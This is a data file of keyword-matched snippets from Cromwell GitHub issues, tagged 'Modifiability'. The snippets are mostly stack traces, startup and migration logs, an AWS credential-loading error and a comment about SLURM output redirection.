Modifiability,syncExecutionActor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1506,config,config,1506,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,syncJobExecutionActor.$anonfun$isAlive$1(SharedFileSystemAsyncJobExecutionActor.scala:196); 	at scala.runtime.java8.JFunction0$mcZ$sp.apply(JFunction0$mcZ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1708,config,config,1708,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['config'],['config']
Modifiability,"t added to CUSTOM_LABEL_ENTRY(CUSTOM_LABEL_KEY, WORKFLOW_EXECUTION_UUID); 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: ChangeSet metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96662,config,configured,96662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"t akka.actor.LightArrayRevolverScheduler$$anon$8.executeBucket$1(Scheduler.scala:419); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Scheduler.scala:423); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Scheduler.scala:375); at java.lang.Thread.run(Thread.java:745); [2015-12-18 08:43:19,174] [info] Message [cromwell.engine.workflow.WorkflowManagerActor$RestartWorkflows] from Actor[akka://cromwell-system/user/WorkflowManagerActor#-1616857312] to Actor[akka://cromwell-system/user/WorkflowManagerActor#-1616857312] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2015-12-18 08:43:19,180] [info] Message [akka.actor.Status$Failure] from Actor[akka://cromwell-system/user/WorkflowManagerActor#-1616857312] to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2015-12-18 08:43:19,182] [error] WorkflowManagerActor: Workflow failed submission: cannot create children while terminating or terminated; java.lang.IllegalStateException: cannot create children while terminating or terminated; at akka.actor.dungeon.Children$class.makeChild(Children.scala:199); at akka.actor.dungeon.Children$class.actorOf(Children.scala:37); at akka.actor.ActorCell.actorOf(ActorCell.scala:369); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$11.apply(WorkflowManagerActor.scala:246); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$11.apply(WorkflowManagerActor.scala:245); at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); at scala.util.Try$.apply(Try.scala:192); at scala.util.Success.map(Try.scala:237); at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235); at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235); at sc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/334:2776,config,configuration,2776,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/334,1,['config'],['configuration']
Modifiability,"t akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunn",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2083,Config,ConfigAsyncJobExecutionActor,2083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"t changesets/resync_engine_schema.xml::restore_auto_increment_call_caching_hash_entry_id_postgresql::kshakir:; Reason: liquibase.exception.DatabaseException: ERROR: syntax error at or near ""as""; Position: 73 [Failed SQL: alter sequence ""CALL_CACHING_HASH_ENTRY_CALL_CACHING_HASH_ENTRY_ID_seq"" as bigint]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:637); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:53); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.Liquibase.update(Liquibase.java:202); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:67); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:39); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:156); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: ERROR: syntax error at or near ""as""; Position: 73 [Failed SQL: alter sequence ""CALL_CACHING_HASH_ENTRY_CALL_CACHING_HASH_ENTRY_ID_seq"" as bigint]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:356); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcEx",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5083:36030,adapt,adapted,36030,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5083,1,['adapt'],['adapted']
Modifiability,t cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:264); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:141); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:140); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:124); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:121); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:599); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:599); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:599); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:912); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:904); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:2648,Config,ConfigAsyncJobExecutionActor,2648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"t out a line `File out_false = if false then glob('test1.txt')[0] else glob('test2.txt')[0] # try commenting this out` in output {}, then I get an error. ```; $ java -jar ../cromwell-29.jar run test_select_first_in_if_in_output.wdl; Picked up _JAVA_OPTIONS: -Xms256M -Xmx1024M -XX:ParallelGCThreads=1; [2017-12-01 20:00:53,03] [info] Running with database db.url = jdbc:hsqldb:mem:6ae82874-e5ea-4c15-9f1d-09f8d0406019;shutdown=false;hsqldb.tx=mvcc; [2017-12-01 20:01:00,60] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-12-01 20:01:00,61] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-12-01 20:01:01,07] [info] Slf4jLogger started; [2017-12-01 20:01:01,35] [info] Metadata summary refreshing every 2 seconds.; [2017-12-01 20:01:01,37] [info] WriteMetadataActor configured to write to the database with batch size 200 and flush rate 5 seconds.; [2017-12-01 20:01:01,51] [info] CallCacheWriteActor configured to write to the database with batch size 100 and flush rate 3 seconds.; [2017-12-01 20:01:02,89] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-12-01 20:01:02,94] [info] Workflow 132d7527-a0af-4f08-8291-d935e7cd5632 submitted.; [2017-12-01 20:01:02,94] [info] SingleWorkflowRunnerActor: Workflow submitted 132d7527-a0af-4f08-8291-d935e7cd5632; [2017-12-01 20:01:02,95] [info] 1 new workflows fetched; [2017-12-01 20:01:02,95] [info] WorkflowManagerActor Starting workflow 132d7527-a0af-4f08-8291-d935e7cd5632; [2017-12-01 20:01:02,96] [info] WorkflowManagerActor Successfully started WorkflowActor-132d7527-a0af-4f08-8291-d935e7cd5632; [2017-12-01 20:01:02,96] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-12-01 20:01:03,27] [info] MaterializeWorkflowDescriptorActor [132d7527]: Call-to-Backend assignments: test.t1 -> Local; [2017-12-01 20:01:04,64] [info] WorkflowExecutionActor-132d7527-a0af-4f08-8291-d935e7cd5632 [132d7527]: Starting calls: test.t1:NA:1; [2017-12-0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2972:1411,config,configured,1411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2972,1,['config'],['configured']
Modifiability,t perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.makeProcessRunner(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$execute$2(SharedFileSystemAsyncJobExecutionActor.scala:145); at scala.util.Either.fold(Either.scala:188); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:144); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:139); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2781,config,config,2781,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['config'],['config']
Modifiability,"t slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); ```; with the linked change; https://github.com/jeremiahsavage/cromwell/commit/88f82a0d699184358149a17a5c1d957704cdced3; the database table creation proceeds; as it undoes one of the changes in this commit; https://github.com/broadinstitute/cromwell/commit/775d2cb414734080978cc9c2533cab41b4acfad5; ```; [jeremiah@localhost cromwell]$ java -Dconfig.file=/home/jeremiah/cromwell.mysql.conf -jar server/target/scala-2.12/cromwell-37-88f82a0-SNAP.jar server; 2019-01-31 18:42:55,062 INFO - Running with database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; 2019-01-31 18:43:01,372 INFO - Successfully acquired change log lock; 2019-01-31 18:43:04,396 INFO - Creating database history table with name: cromwell.DATABASECHANGELOG; 2019-01-31 18:43:04,492 INFO - Reading from cromwell.DATABASECHANGELOG; 2019-01-31 18:43:04,918 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,926 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,926 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,927 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,927 WARN - modifyDataType will lose primary key/autoincrement/not null setting",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:4574,rewrite,rewriteBatchedStatements,4574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,t sun.nio.ch.FileDispatcherImpl.read0(Native Method); at sun.nio.ch.FileDispatcherImpl.read(FileDispatcherImpl.java:46); at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:223); at sun.nio.ch.IOUtil.read(IOUtil.java:197); at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); - locked <0x00000006c54b2e78> (a java.lang.Object); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); - locked <0x00000006c54b2ec8> (a sun.nio.ch.ChannelInputStream); at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:798); at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.util.TryWithResource$$anonfun$tryWithResource$1.apply(TryWithResource.scala:16); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:47); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingAc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:1387,Config,ConfigHashingStrategy,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['Config'],['ConfigHashingStrategy']
Modifiability,"t, if not then I can set things up differently. Thanks. `cromwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])): Profile file contained no credentials for profile 'default': ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])]), ContainerCredentialsProvider(): Cannot fetch credentials from container - neither AWS_CONTAINER_CREDENTIALS_FULL_URI or AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variables are set., InstanceProfileCredentialsProvider(): Unable to load credentials from service endpoint.]; cromwell_1 | 	at software.amazon.awssdk.core.exception.SdkClientException$BuilderImpl.build(SdkClientException.java:97); cromwell_1 | 	at software.amazon.awssdk.auth",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:2035,variab,variable,2035,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['variab'],['variable']
Modifiability,"t-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, whic",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:2912,config,configurations,2912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configurations']
